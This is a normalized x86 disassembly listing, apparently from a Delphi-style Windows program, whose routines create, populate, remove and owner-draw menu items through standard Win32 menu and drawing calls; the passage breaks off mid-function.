test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_458230
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043f4
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4044a8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_458658
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_456bec
mov [ ebp - 0x25 ] eax
sub_456957
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_4566dc
xor eax eax
pop ebp
retn
sub_45697c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45a250
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459218
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459714
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_456118
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4569ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456a36
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d848
mov eax [ ebp - 0x4 ]
call sub_455fa0
mov edx eax
mov eax ebx
call sub_45868c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456a3d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_456a44
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_456abc
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_42093c
sub_456a80
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420cbc
mov eax ebx
call sub_458640
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_458640
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40346c
pop esi
pop ebx
retn
mov eax ebx
call sub_456abc
sub_456abc
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_456bec
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_456abc
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_456bec
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_456bec
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45697c
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebp
call sub_456bec
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_456b8c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_458658
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_458668
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_458668
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_458668
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_455c94
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_456bec
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45697c
mov eax [ rw-data ]
call sub_455c94
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_456c38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420be4
push ebx
push sub_4569ec
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_456c7c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_456e60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_458c14
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404080
test bh 0x4
je r-xdata
mov eax edi
call sub_45a250
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043f4
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424200
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042b0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423bd8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423be4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e67
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424b20
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042a8
push eax
mov eax [ ebp - 0xc ]
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
call sub_424b20
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423918
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042a8
push eax
mov eax [ ebp - 0xc ]
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
call sub_424b20
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423918
mov eax 0xff00000d
call sub_423458
mov esi eax
mov eax 0xff000010
call sub_423458
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423918
jmp r-xdata
sub_456ecc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4577b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4240e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423918
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043f4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4240e4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_453c90
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b20
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4240e4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_457313
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4283e0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_453c90
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4240e4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4293e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240b8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424900
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_453f80
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240e4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_456c7c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423be4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b20
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_42469c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403270
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b20
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
